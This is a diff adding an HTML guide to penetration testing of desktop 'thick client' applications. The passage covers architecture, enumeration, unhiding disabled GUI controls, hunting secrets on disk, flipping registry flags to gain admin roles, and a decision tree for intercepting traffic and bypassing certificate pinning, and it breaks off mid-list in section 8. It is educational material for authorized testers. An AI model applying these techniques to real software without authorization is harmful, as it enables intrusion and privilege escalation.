@@ -1,0 +1,1082 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Thick Client Security · desktop app pentesting deep dive · Cyber Atlas</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --void:#0A1418; --slab:#0F1E24; --panel:#132831; --edge:#1E3B47;
+  --mist:#9DB6BF; --bone:#EDF5F5; --dim:#5F7C88;
+  --signal:#F2A03D; --cool:#4FC3D9;
+  --crit:#FF5C57; --high:#F2A03D; --med:#E8D14A; --low:#6FD08C;
+  --mono:"IBM Plex Mono",ui-monospace,monospace;
+  --sans:"IBM Plex Sans",system-ui,sans-serif;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;scroll-behavior:smooth}
+body{
+  background:var(--void);
+  background-image:linear-gradient(var(--slab) 1px,transparent 1px),linear-gradient(90deg,var(--slab) 1px,transparent 1px);
+  background-size:44px 44px;
+  color:var(--mist);font-family:var(--sans);font-size:15px;line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+.wrap{max-width:1100px;margin:0 auto;padding:0 20px 120px}
+a{color:var(--cool);text-decoration:none;border-bottom:1px solid rgba(79,195,217,.3)}
+a:hover{color:var(--bone);border-color:var(--cool)}
+
+header{padding:34px 0 22px;border-bottom:1px solid var(--edge);margin-bottom:10px}
+.brand{font-family:var(--mono);font-size:11px;letter-spacing:.24em;color:var(--dim);text-transform:uppercase}
+.back{float:right;font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase}
+h1{font-family:var(--mono);font-weight:600;font-size:clamp(24px,4vw,36px);color:var(--bone);margin:8px 0 6px;letter-spacing:-.02em}
+h1 span{color:var(--signal)}
+.sub{margin:0;max-width:80ch;color:var(--mist)}
+.tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+.chip{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;padding:4px 10px;
+  border:1px solid var(--edge);color:var(--mist);border-radius:2px}
+.chip.warn{color:var(--signal);border-color:var(--signal)}
+
+.exec{border:1px solid var(--edge);border-left:2px solid var(--signal);background:var(--slab);padding:18px 22px;margin:28px 0}
+.exec ol{margin:0;padding-left:20px}
+.exec li{margin:5px 0;color:var(--bone)}
+.exec .h{font-family:var(--mono);font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--signal);display:block;margin-bottom:10px}
+
+.toc{border:1px solid var(--edge);background:var(--slab);padding:16px 22px;margin:0 0 34px;columns:2;column-gap:34px}
+.toc a{display:block;font-family:var(--mono);font-size:12.5px;padding:4px 0;border:0;color:var(--mist)}
+.toc a:hover{color:var(--signal)}
+@media(max-width:680px){.toc{columns:1}}
+
+section{margin:48px 0;scroll-margin-top:16px}
+h2{font-family:var(--mono);font-size:20px;color:var(--bone);margin:0 0 6px;font-weight:600;letter-spacing:-.01em;
+  padding-top:18px;border-top:1px solid var(--edge)}
+h2 .num{color:var(--signal);margin-right:10px}
+h3{font-family:var(--mono);font-size:14.5px;color:var(--cool);letter-spacing:.02em;margin:28px 0 8px;font-weight:600}
+h4{font-family:var(--mono);font-size:13px;color:var(--signal);margin:20px 0 6px;font-weight:600}
+p{margin:12px 0}
+ul,ol{margin:12px 0}
+li{margin:5px 0}
+code{font-family:var(--mono);font-size:.88em;background:var(--void);border:1px solid var(--edge);
+  padding:1px 6px;border-radius:2px;color:#CFE6EC;word-break:break-word}
+strong{color:var(--bone);font-weight:600}
+
+pre{margin:16px 0;background:var(--void);border:1px solid var(--edge);border-left:2px solid var(--cool);
+  padding:14px 16px;font-family:var(--mono);font-size:12.5px;color:#CFE6EC;overflow-x:auto;line-height:1.7}
+pre .cm{color:var(--dim)}
+
+table{width:100%;border-collapse:collapse;margin:16px 0;font-size:13px}
+th,td{border:1px solid var(--edge);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--panel);color:var(--bone);font-family:var(--mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;font-weight:600}
+td{color:var(--mist)}
+td code,th code{background:transparent;border:0;padding:0;color:var(--cool)}
+.tbl-wrap{overflow-x:auto}
+
+.callout{border:1px dashed var(--edge);background:rgba(79,195,217,.05);padding:13px 16px;margin:16px 0}
+.callout.warn{border-color:rgba(242,160,61,.5);background:rgba(242,160,61,.06)}
+.callout.crit{border-color:rgba(255,92,87,.5);background:rgba(255,92,87,.06)}
+.callout .lbl{font-family:var(--mono);font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--signal);display:block;margin-bottom:5px}
+.callout.crit .lbl{color:var(--crit)}
+
+.fig{margin:22px 0;border:1px solid var(--edge);background:var(--slab);padding:6px 6px 12px}
+.fig .cap{font-family:var(--mono);font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim);padding:9px 14px 4px}
+.fig .cap b{color:var(--signal)}
+.mermaid{background:transparent;text-align:center;overflow-x:auto;padding:8px}
+
+.gloss dt{font-family:var(--mono);color:var(--signal);font-size:13px;margin-top:12px}
+.gloss dd{margin:2px 0 0;padding-left:0;color:var(--mist)}
+
+.sev-crit{color:var(--crit)} .sev-high{color:var(--high)} .sev-med{color:var(--med)} .sev-low{color:var(--low)}
+.note{font-family:var(--mono);font-size:11px;color:var(--dim);margin-top:44px;padding-top:16px;border-top:1px solid var(--edge)}
+:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+.topjump{position:fixed;right:16px;bottom:16px;font-family:var(--mono);font-size:11px;background:var(--panel);
+  border:1px solid var(--edge);color:var(--mist);padding:8px 12px;border-radius:2px}
+
+/* ---- interactive widgets ---- */
+.lab{border:1px solid var(--edge);background:var(--slab);margin:22px 0;border-left:2px solid var(--signal)}
+.lab-head{font-family:var(--mono);font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--signal);
+  padding:11px 16px;border-bottom:1px solid var(--edge);display:flex;align-items:center;gap:10px}
+.lab-head .tag{margin-left:auto;color:var(--dim);letter-spacing:.1em}
+.lab-body{padding:16px}
+.ctrl{display:flex;flex-wrap:wrap;gap:14px;margin-bottom:8px}
+.ctrl label{font-family:var(--mono);font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.08em;
+  display:flex;flex-direction:column;gap:6px}
+.ctrl select{background:var(--void);border:1px solid var(--edge);color:var(--bone);font-family:var(--mono);
+  font-size:13px;padding:8px 10px;border-radius:2px;outline:none;min-width:190px}
+.ctrl select:focus{border-color:var(--signal)}
+.out{margin-top:14px;border:1px solid var(--edge);background:var(--void);padding:14px 16px;border-left:2px solid var(--cool)}
+.out .verdict{font-family:var(--mono);font-size:13px;color:var(--bone);font-weight:600;margin-bottom:8px}
+.out ul{margin:6px 0 0;padding-left:18px}
+.out li{color:var(--mist);font-size:13.5px}
+.out .ease{font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;padding:2px 8px;border:1px solid currentColor;border-radius:2px;margin-left:8px}
+
+.btnrow{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin:6px 0 12px}
+.wbtn{font-family:var(--mono);font-size:12px;letter-spacing:.08em;text-transform:uppercase;background:transparent;
+  border:1px solid var(--edge);color:var(--mist);padding:9px 14px;border-radius:2px;cursor:pointer}
+.wbtn:hover{border-color:var(--signal);color:var(--bone)}
+.wbtn.on{background:var(--signal);border-color:var(--signal);color:#0A1418;font-weight:600}
+.toggle{display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-size:12px;color:var(--mist);cursor:pointer}
+.toggle input{accent-color:var(--signal);width:15px;height:15px}
+
+/* dll search order sim */
+.orderlist{list-style:none;margin:8px 0 0;padding:0;counter-reset:step}
+.orderlist li{position:relative;border:1px solid var(--edge);background:var(--void);margin:6px 0;padding:10px 14px 10px 44px;
+  font-family:var(--mono);font-size:12.5px;color:var(--mist);border-radius:2px;transition:all .18s}
+.orderlist li::before{counter-increment:step;content:counter(step);position:absolute;left:0;top:0;bottom:0;width:32px;
+  display:flex;align-items:center;justify-content:center;background:var(--panel);color:var(--dim);border-right:1px solid var(--edge)}
+.orderlist li .tagr{float:right;font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:var(--dim)}
+.orderlist li.scanning{border-color:var(--cool);color:var(--bone)}
+.orderlist li.hit{border-color:var(--crit);background:rgba(255,92,87,.08);color:var(--bone)}
+.orderlist li.hit .tagr{color:var(--crit)}
+.orderlist li.safe{border-color:var(--low);background:rgba(111,208,140,.07);color:var(--bone)}
+.orderlist li.safe .tagr{color:var(--low)}
+.orderlist li.writable{border-style:dashed}
+.simout{margin-top:12px;font-family:var(--mono);font-size:12.5px;padding:11px 14px;border:1px solid var(--edge);background:var(--void)}
+.simout.bad{border-color:var(--crit);color:#FFD9D7}
+.simout.good{border-color:var(--low);color:#D6F1DE}
+
+/* IL patch toggle */
+.patchwrap{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:680px){.patchwrap{grid-template-columns:1fr}}
+.patchcol h4{margin-top:0}
+.mockbtn{display:inline-block;font-family:var(--sans);font-size:13px;padding:8px 16px;border-radius:3px;margin-top:8px}
+.mockbtn.off{background:#26333a;color:#6d7f88;border:1px solid #33454d;cursor:not-allowed}
+.mockbtn.on{background:var(--signal);color:#0A1418;border:1px solid var(--signal);font-weight:600;cursor:pointer}
+
+/* checklist */
+.chk{border:1px solid var(--edge);background:var(--void);margin:8px 0;padding:0}
+.chk summary{cursor:pointer;padding:11px 14px;font-family:var(--mono);font-size:12.5px;color:var(--bone);
+  list-style:none;display:flex;align-items:center;gap:10px}
+.chk summary::-webkit-details-marker{display:none}
+.chk summary .mini{margin-left:auto;font-size:11px;color:var(--dim)}
+.chk[open] summary{border-bottom:1px solid var(--edge)}
+.chk ul{list-style:none;margin:0;padding:8px 14px 12px}
+.chk li{margin:3px 0}
+.chk label{display:flex;gap:9px;align-items:flex-start;font-size:13.5px;color:var(--mist);cursor:pointer}
+.chk input{accent-color:var(--low);margin-top:3px;width:15px;height:15px;flex:0 0 15px}
+.chk input:checked + span{color:var(--dim);text-decoration:line-through}
+.progwrap{display:flex;align-items:center;gap:12px;margin:10px 0 4px}
+.progbar{flex:1;height:8px;background:var(--panel);border:1px solid var(--edge);border-radius:20px;overflow:hidden}
+.progbar i{display:block;height:100%;width:0;background:var(--low);transition:width .3s}
+.progtxt{font-family:var(--mono);font-size:12px;color:var(--mist);min-width:96px;text-align:right}
+</style>
+</head>
+<body>
+<div class="wrap" id="top">
+
+<header>
+  <a class="back" href="./index.html">&larr; Cyber Atlas</a>
+  <div class="brand">Deep dive · Thick client security</div>
+  <h1>Thick Client · <span>Desktop App</span> Penetration Testing</h1>
+  <p class="sub">A single, plain-English map of how to test installed desktop applications. It covers what a thick client is, the two ways they are built, the full eight-phase test flow, and the four attacks that define this field: reading secrets from memory, patching the binary, hijacking a DLL, and intercepting non-web traffic. Written in simple technical English with diagrams and small interactive demos, for authorized testing and defense only.</p>
+  <div class="tags">
+    <span class="chip">OWASP-based checklist</span>
+    <span class="chip">.NET · Java · C/C++ · Electron</span>
+    <span class="chip">Burp · Frida · dnSpy · Procmon</span>
+    <span class="chip">DVTA · BetaFast labs</span>
+    <span class="chip warn">Educational · authorized testing only</span>
+  </div>
+</header>
+
+<div class="exec">
+<span class="h">The whole page in five lines</span>
+<ol>
+<li>A <strong>thick client</strong> is an app installed on the user's machine that does real work locally. Because it runs on your machine, you control its memory, files, registry, and binary. That control is the whole game.</li>
+<li>First find out how it is built. <strong>Two-tier</strong> (app talks straight to a database) leaks raw queries and DB passwords. <strong>Three-tier</strong> (app talks to a server) turns most of the test into normal web and API testing.</li>
+<li>The client-side attacks that are unique to thick clients: <strong>read secrets from live memory</strong>, <strong>decompile and patch the binary</strong>, <strong>hijack a DLL</strong> for code execution, and <strong>intercept traffic</strong> that ignores your proxy.</li>
+<li>The blockers are almost always the same two things: the client <strong>ignores your proxy</strong>, or it <strong>pins its certificate</strong>. This page shows how to get past both.</li>
+<li>Nearly every finding reduces to one root cause: the app <strong>trusts the client</strong>. The fix is always to move the check to the server.</li>
+</ol>
+</div>
+
+<nav class="toc">
+  <a href="#s1">1 · What a thick client is</a>
+  <a href="#s2">2 · Architecture: two-tier vs three-tier</a>
+  <a href="#s3">3 · The test flow, end to end</a>
+  <a href="#s4">4 · Phase 1 · Enumeration</a>
+  <a href="#s5">5 · Phase 2 · GUI logic</a>
+  <a href="#s6">6 · Phase 3 · Files &amp; binary</a>
+  <a href="#s7">7 · Phase 4 · Registry</a>
+  <a href="#s8">8 · Phase 5 · Traffic interception</a>
+  <a href="#s9">9 · Phase 6 · Binary hardening</a>
+  <a href="#s10">10 · Phase 7 · Memory</a>
+  <a href="#s11">11 · Phase 8 · Common vulns</a>
+  <a href="#s12">12 · DLL hijacking (deep dive)</a>
+  <a href="#s13">13 · Reverse engineering &amp; patching</a>
+  <a href="#s14">14 · Language notes</a>
+  <a href="#s15">15 · Case studies</a>
+  <a href="#s16">16 · Interactive checklist</a>
+  <a href="#s17">17 · Reporting &amp; fixes</a>
+  <a href="#gloss">Glossary</a>
+</nav>
+
+<!-- ============ SECTION 1 ============ -->
+<section id="s1">
+<h2><span class="num">1</span>What a thick client is</h2>
+<p>A <strong>thick client</strong> (also called a fat client, rich client, or just a desktop app) is a program you install on your computer that does a large part of the work on your own machine. This is the opposite of a <strong>thin client</strong>, like a website in a browser, where the server does the work and the browser only shows the result.</p>
+<p>A thick client usually:</p>
+<ul>
+<li>Has an <strong>installer</strong> and leaves files on disk and keys in the registry.</li>
+<li>Runs as one or more <strong>processes</strong> in memory.</li>
+<li>May or may not talk to a server, an API, or a database.</li>
+<li>Keeps state locally: config files, logs, cached data, saved logins.</li>
+</ul>
+<p>Everyday examples: Burp Suite itself, web browsers, Zoom, Microsoft Teams, Slack, PC games, trading terminals, and admin consoles.</p>
+
+<div class="callout"><span class="lbl">The one idea that matters</span>In web testing the server is a black box you poke from outside. In thick client testing the app runs <strong>on your machine</strong>, so you own the whole environment: its memory, its files, its registry keys, and its binary. That is why reverse engineering, memory editing, and binary patching are first-class attacks here, not edge cases.</div>
+
+<div class="fig">
+<div class="cap"><b>Diagram A</b> · where the work happens, and what that hands to the tester</div>
+<pre class="mermaid">
+flowchart LR
+  subgraph THIN["Thin client (website)"]
+    B["Browser\nshows result"] -->|HTTP| SRV1["Server\ndoes the work"]
+  end
+  subgraph THICK["Thick client (desktop app)"]
+    C["App on YOUR machine\ndoes real work locally"] -->|maybe| SRV2["Server / DB"]
+  end
+  C -.-> OWN["You control:\nmemory · files\nregistry · binary"]
+</pre>
+</div>
+
+<h4>Why they are worth attacking</h4>
+<ul>
+<li>Business rules and input checks may run <strong>only on the client</strong>, so they can be bypassed.</li>
+<li>Secrets (passwords, API keys, license keys, DB connection strings, crypto keys) are often <strong>hardcoded in the binary</strong>, sitting in <strong>config or registry</strong>, or left in <strong>memory</strong>.</li>
+<li>Install folders and DLL loading create <strong>privilege escalation</strong> paths (DLL hijacking, weak file or service permissions).</li>
+<li>Older apps often use <strong>non-web protocols</strong> and sometimes <strong>certificate pinning</strong>, which makes traffic interception harder.</li>
+</ul>
+</section>
+
+<!-- ============ SECTION 2 ============ -->
+<section id="s2">
+<h2><span class="num">2</span>Architecture: two-tier vs three-tier</h2>
+<p>Before anything else, find out how the app is built. There are two shapes, and which one you face decides the whole test plan.</p>
+
+<h3>2.1 Two-tier: app talks straight to the database</h3>
+<p>There are only two parts: the app and a database. The app holds both the screen and the business logic. It sends queries <strong>directly</strong> to the database, often over the local network, with no server in the middle.</p>
+<p>This is the <strong>insecure</strong> shape. When you watch the traffic you often see <strong>raw SQL queries</strong> and the <strong>database username and password</strong> going across the wire. Anyone on the network can read them.</p>
+
+<h3>2.2 Three-tier: app talks to a server, server talks to the database</h3>
+<p>A <strong>middle server</strong> is added. The app sends requests to that server (usually over HTTP, SOAP, or gRPC). The server runs the logic and is the only thing that touches the database.</p>
+<p>This is the <strong>safer</strong> shape, and it is good news for the tester too. Once you capture the app-to-server API traffic, most of your work becomes ordinary <strong>web and API testing</strong> (OWASP Top 10). Example: Zoom, which sends a lot of HTTP, WebSocket, and WebRTC traffic.</p>
+
+<div class="fig">
+<div class="cap"><b>Diagram B</b> · the two architectures, and what each one leaks</div>
+<pre class="mermaid">
+flowchart TB
+  subgraph TWO["Two-tier  (insecure)"]
+    direction LR
+    A1["Thick client\n+ business logic"] -->|"raw SQL, DB creds\non the wire"| D1[("Database")]
+  end
+  subgraph THREE["Three-tier  (safer)"]
+    direction LR
+    A2["Thick client\n(UI only)"] -->|"HTTP / SOAP / gRPC\nAPI calls"| S2["App server\n(logic)"]
+    S2 --> D2[("Database")]
+  end
+</pre>
+</div>
+
+<h3>2.3 How to tell them apart</h3>
+<ol>
+<li><strong>Ask the developers.</strong> Fastest, when you can.</li>
+<li><strong>Watch the traffic</strong> with Wireshark or a socket interceptor:
+  <ul>
+  <li>You see raw SQL or a database protocol on the wire, likely <strong>two-tier</strong>.</li>
+  <li>You see structured API calls like <code>GET /path HTTP/1.1</code> and <code>Authorization: Bearer ...</code>, likely <strong>three-tier</strong>.</li>
+  </ul>
+</li>
+</ol>
+
+<h3>2.4 The other axis: does the app respect your proxy?</h3>
+<p>This is separate from tier count, and it decides <strong>how hard interception will be</strong>. You will meet this again in Phase 5.</p>
+<div class="tbl-wrap"><table>
+<tr><th>Type</th><th>Behavior</th><th>How hard to intercept</th></tr>
+<tr><td><strong>Proxy-aware</strong></td><td>Honors the system or app proxy setting. Point it at Burp and go (browsers, Slack, Teams).</td><td class="sev-low">Easy</td></tr>
+<tr><td><strong>Proxy-unaware</strong></td><td>Ignores proxy settings and talks straight over raw sockets. Common in older apps.</td><td class="sev-high">Hard. Needs a socket interceptor, a hosts-file trick, or API hooking. Pinning may also be in the way.</td></tr>
+</table></div>
+</section>
+
+<!-- ============ SECTION 3 ============ -->
+<section id="s3">
+<h2><span class="num">3</span>The test flow, end to end</h2>
+<p>There is no single official standard for thick client testing. The working method used across the field breaks into <strong>four big stages</strong>. The detailed eight-phase checklist (Sections 4 to 11) fits inside these four.</p>
+
+<ol>
+<li><strong>Enumeration.</strong> Find the language and framework, the architecture (two vs three tier), whether traffic can be intercepted, and every place the app takes input.</li>
+<li><strong>Client-side checks.</strong> This is the part that is unique to thick clients. Not simple input validation, but binary analysis, memory analysis, reverse engineering, local storage, registry, DLL hijacking, and GUI logic. Everything you can do because the app runs on your machine.</li>
+<li><strong>Network attacks.</strong> Intercept traffic. Attack the connections the app makes to other services (a database, FTP, SMTP), for example to steal credentials off the wire.</li>
+<li><strong>Server-side attacks.</strong> Once you can see the API, run the full OWASP Web and API Top 10, exactly like a web or mobile test.</li>
+</ol>
+
+<div class="callout"><span class="lbl">Mental model</span>The only parts that are truly different from web and mobile testing are the first two stages: enumeration and the client-side checks. The moment you are capturing API traffic, it is the same game you already know.</div>
+
+<div class="fig">
+<div class="cap"><b>Diagram C</b> · the four stages and the eight phases inside them</div>
+<pre class="mermaid">
+flowchart TB
+  START(["Target app"]) --> E["Stage 1 · Enumeration\nPhase 1"]
+  E --> CS["Stage 2 · Client-side checks\nPhase 2 GUI · 3 Files/Binary\n4 Registry · 6 Hardening · 7 Memory"]
+  CS --> NET["Stage 3 · Network\nPhase 5 Traffic interception"]
+  NET --> SS["Stage 4 · Server-side\nPhase 8 · OWASP Web + API Top 10"]
+  SS --> REP(["Report"])
+</pre>
+</div>
+
+<h3>The three things that slow you down</h3>
+<ul>
+<li><strong>Setup.</strong> Each app may need its own OS, runtime, and backends (SQL Server, FTP, SMTP). Take VM snapshots so you can roll back.</li>
+<li><strong>Language.</strong> Client-side attacks need you to read the app's language (Java, .NET, C++). Weak familiarity blunts this whole stage.</li>
+<li><strong>Interception.</strong> Proxy-unaware clients plus certificate pinning are the biggest practical blockers.</li>
+</ul>
+</section>
+
+<!-- ============ SECTION 4 ============ -->
+<section id="s4">
+<h2><span class="num">4</span>Phase 1 · Enumeration</h2>
+<p>Goal: learn what you are looking at before you touch anything. Walk every screen and answer these questions.</p>
+<ul>
+<li>Two-tier or three-tier?</li>
+<li>What language and framework? (.NET, Java, C/C++, VB, Electron)</li>
+<li>What does it talk to, on which ports and protocols?</li>
+<li>What processes does it run?</li>
+<li>What does every feature do?</li>
+<li>Where are all the input points?</li>
+<li>How does login and access control work?</li>
+</ul>
+
+<h3>4.1 Identify the language, do not guess it</h3>
+<p>The UI tells you nothing reliable. Open the binary in a PE inspector.</p>
+<ul>
+<li><strong>CFF Explorer</strong>, <strong>Detect It Easy (DIE)</strong>, or <strong>PEiD</strong>. The file type gives it away. For example "Portable Executable 32 .NET Assembly" means a .NET app. Check the headers, imports, and the .NET directory.</li>
+<li><strong>strings</strong> on the binary reveals library names that point to the framework.</li>
+</ul>
+
+<h3>4.2 Watch processes and network</h3>
+<ul>
+<li><strong>Process Explorer</strong> or <strong>Process Hacker</strong>: PID, loaded DLLs, handles, child processes.</li>
+<li><strong>TCPView</strong>: live per-process connections. Filter by the app name (for example <code>dvta.exe</code>) and watch new sockets appear as you trigger actions like login or backup.</li>
+</ul>
+
+<h3>4.3 Map every entry point</h3>
+<p>List every way data gets in: input fields, file imports, network listeners, IPC endpoints, command-line arguments, environment variables, registry reads, and config-file paths. This list drives the rest of the test.</p>
+<p><strong>Tools:</strong> CFF Explorer, Detect It Easy, PEiD, Strings, TCPView, Process Explorer, Process Hacker, Wireshark.</p>
+</section>
+
+<!-- ============ SECTION 5 ============ -->
+<section id="s5">
+<h2><span class="num">5</span>Phase 2 · GUI logic</h2>
+<p>Thick client UIs often enforce rules <strong>only visually</strong>. Buttons are greyed out, forms are hidden, passwords are shown as dots. Because the UI runs on your machine, you can change all of it directly. If there is no server-side check behind a hidden control, flipping it visible is a real bypass.</p>
+
+<h3>5.1 What to try</h3>
+<ul>
+<li><strong>Show hidden controls</strong> the app is hiding.</li>
+<li><strong>Enable disabled buttons and menus</strong> (for example DVTA's greyed-out "Configure Server" button, or BetaFast's hidden admin menu).</li>
+<li><strong>Unmask password fields</strong>, turning the dots back into cleartext.</li>
+<li><strong>Look for sensitive data</strong> sitting in the UI: keys, tokens, internal hostnames, debug text.</li>
+<li>Test the UI for <strong>access control gaps</strong>, <strong>injection</strong>, <strong>verbose errors</strong>, <strong>weak input checks</strong>, <strong>privilege escalation</strong> (unlock admin features), and <strong>value or price manipulation</strong>.</li>
+</ul>
+
+<h3>5.2 How it is done</h3>
+<ul>
+<li><strong>WinSpy++</strong>, <strong>Window Detective</strong>, <strong>UISpy</strong>: list Win32 window handles and change control styles. Clear <code>ES_PASSWORD</code> to unmask, clear <code>WS_DISABLED</code> to enable, set <code>WS_VISIBLE</code> to reveal.</li>
+<li><strong>Snoop</strong> (for WPF/XAML apps): attach to the running app, browse the visual tree, and edit any element live. Change <code>Visibility</code> from <code>Hidden</code> to <code>Visible</code>, or <code>IsEnabled</code> to true. This is exactly the BetaFast admin-panel bypass in Section 15.</li>
+</ul>
+<p><strong>Tools:</strong> WinSpy++, Window Detective, UISpy, Snoop (WPF).</p>
+</section>
+
+<!-- ============ SECTION 6 ============ -->
+<section id="s6">
+<h2><span class="num">6</span>Phase 3 · Files &amp; binary</h2>
+<p>This is the richest client-side surface. It covers everything the app ships on disk plus what you can pull out of the binary.</p>
+
+<h3>6.1 File permissions</h3>
+<p>Check the permissions on every file and folder the app uses: install folder, config, logs, data. A world-writable file or folder in a privileged app's path leads to tampering, DLL hijacking, or privilege escalation. Use <strong>AccessChk</strong>, <strong>AccessEnum</strong>, or <code>icacls</code>.</p>
+
+<h3>6.2 Is the binary signed and intact?</h3>
+<ul>
+<li>Check <strong>strong naming</strong> for .NET assemblies.</li>
+<li>Check <strong>code signing</strong> with <strong>Sigcheck</strong>: <code>sigcheck.exe &lt;binary&gt;</code> shows Signed or Unsigned plus the publisher. An unsigned production binary is a finding and makes tampering easy.</li>
+</ul>
+
+<h3>6.3 Hunt for secrets on disk</h3>
+<p>Look in the binary and in every config or data file for:</p>
+<ul>
+<li>Passwords, connection strings, API keys, tokens.</li>
+<li>Secrets in the config file (<code>app.config</code>, <code>*.exe.config</code>, <code>.ini</code>, <code>.json</code>).</li>
+<li>Hardcoded crypto material (keys, IVs, salts).</li>
+<li>Cleartext storage of sensitive data.</li>
+<li>Leftover data in temp files or crash dumps, and secrets written to logs.</li>
+</ul>
+<p>Techniques: run <strong>strings</strong> on the binary and on-disk files (DVTA leaks an FTP password this way). Use <strong>Procmon</strong> to watch which files and paths the app reads and writes at runtime (<code>%APPDATA%</code>, <code>%TEMP%</code>, the install folder).</p>
+
+<h3>6.4 Manipulate and bypass</h3>
+<ul>
+<li><strong>DLL preloading / hijacking</strong>, covered in depth in Section 12.</li>
+<li><strong>Race conditions</strong> on files the app reads and writes.</li>
+<li><strong>Replace</strong> data, config, or resource files the app trusts.</li>
+<li>Call <strong>exported functions</strong> of the exe or DLLs directly (find them with CFF Explorer or <code>dumpbin</code>), skipping the login path.</li>
+<li>Write a small <strong>wrapper</strong> that loads the app's assembly or jar and calls its <strong>public methods</strong> directly, bypassing the UI and its auth checks.</li>
+<li><strong>Decompile, edit, rebuild</strong> to recover source and keys or to remove a check (Section 13).</li>
+<li>Check for <strong>lack of obfuscation</strong>. Managed .NET and Java binaries decompile to near-original source when not obfuscated, which is a confidentiality finding on its own.</li>
+</ul>
+<p><strong>Tools:</strong> Strings, dnSpy, ILSpy, Procmon, Process Hacker, CFF Explorer, Sigcheck, AccessChk, AccessEnum.</p>
+</section>
+
+<!-- ============ SECTION 7 ============ -->
+<section id="s7">
+<h2><span class="num">7</span>Phase 4 · Registry</h2>
+<p>Windows thick clients often keep config and secrets in the registry, usually under <code>HKCU\Software\&lt;app&gt;</code> or <code>HKLM\Software\&lt;app&gt;</code>.</p>
+<ul>
+<li>Check <strong>read</strong> and <strong>write</strong> access to the app's keys. A writable privileged key means tampering or privilege escalation.</li>
+<li>Look for <strong>sensitive values</strong>. DVTA stores the username, a password hash, and an email under <code>HKCU\Software\DVTA</code>.</li>
+<li>Try to <strong>change behavior</strong> by editing values, for example flipping an <code>isLoggedIn</code> or <code>isAdmin</code> flag to bypass login or elevate your role.</li>
+</ul>
+
+<h3>7.1 The efficient method: diff before and after</h3>
+<p>Do not browse the whole hive by hand. Use <strong>Regshot</strong>:</p>
+<ol>
+<li>Take <strong>snapshot 1</strong> as a baseline.</li>
+<li>Do the action (install, log in, view profile).</li>
+<li>Take <strong>snapshot 2</strong>.</li>
+<li>Click <strong>Compare</strong>. The HTML diff shows only what the app changed. Searching for the app name jumps you straight to the written values, including any leaked credentials.</li>
+</ol>
+<p>You can also use <strong>Procmon</strong> with a filter on <code>RegSetValue</code> or <code>RegQueryValue</code> to watch registry access live, then confirm and edit in <strong>regedit</strong>.</p>
+<p><strong>Tools:</strong> Regshot, Procmon, AccessEnum, regedit.</p>
+</section>
+
+<!-- ============ SECTION 8 ============ -->
+<section id="s8">
+<h2><span class="num">8</span>Phase 5 · Traffic interception</h2>
+<p>This is usually the hardest phase, and it is where most engagements get stuck. The good news: the decision is mechanical. Answer two questions (does the app respect a proxy, and is it web traffic or not) and the right tool falls out. Use the finder below.</p>
+
+<div class="lab" id="finder">
+  <div class="lab-head">Interactive · Interception strategy finder <span class="tag">pick your situation</span></div>
+  <div class="lab-body">
+    <div class="ctrl">
+      <label>Does the app respect a proxy?
+        <select id="f-proxy">
+          <option value="aware">Proxy-aware</option>
+          <option value="unaware" selected>Proxy-unaware</option>
+        </select>
+      </label>
+      <label>What kind of traffic?
+        <select id="f-proto">
+          <option value="http">HTTP / HTTPS</option>
+          <option value="raw" selected>Non-HTTP (raw TCP, FTP, DB, custom)</option>
+        </select>
+      </label>
+      <label>Certificate pinning?
+        <select id="f-pin">
+          <option value="no" selected>No / unknown</option>
+          <option value="yes">Yes, pinned</option>
+        </select>
+      </label>
+    </div>
+    <div class="out" id="f-out"></div>
+  </div>
+</div>
+
+<h3>8.1 Passive first: just watch</h3>
+<ul>
+<li><strong>Wireshark</strong>: capture on the right interface. For localhost targets use the npcap loopback adapter. Look for cleartext credentials, tokens, database queries (a two-tier smell), and FTP or SMTP logins.</li>
+<li><strong>TCPView</strong>: live per-process connections, as in enumeration.</li>
+</ul>
+
+<h3>8.2 Active interception: the decision tree</h3>
+<div class="fig">
+<div class="cap"><b>Diagram D</b> · how to route each kind of client through your tools</div>
+<pre class="mermaid">
+flowchart TB
+  Q1{"Respects a proxy?"}
+  Q1 -->|Yes| Q2{"Web traffic?"}
+  Q1 -->|No| Q3{"Web traffic?"}
+  Q2 -->|Yes| BURP["Point at Burp\ninstall Burp CA\ntest as web/API"]
+  Q2 -->|No| SOCK1["Socket interceptor\nEcho Mirage / InterceptSuite"]
+  Q3 -->|Yes| HOSTS["hosts file to 127.0.0.1\n+ Burp invisible proxy\nupstream to real host"]
+  Q3 -->|No| SOCK2["Echo Mirage / mitm_relay\n/ InterceptSuite"]
+  BURP --> PIN{"Cert pinned?"}
+  HOSTS --> PIN
+  SOCK1 --> PIN
+  SOCK2 --> PIN
+  PIN -->|Yes| BYPASS["Bypass pinning:\nFrida hook · patch validator\n· inject your CA"]
+  PIN -->|No| DONE(["Traffic in your tools"])
+  BYPASS --> DONE
+</pre>
+</div>
+
+<h3>8.3 The tools that make non-web interception possible</h3>
+<ul>
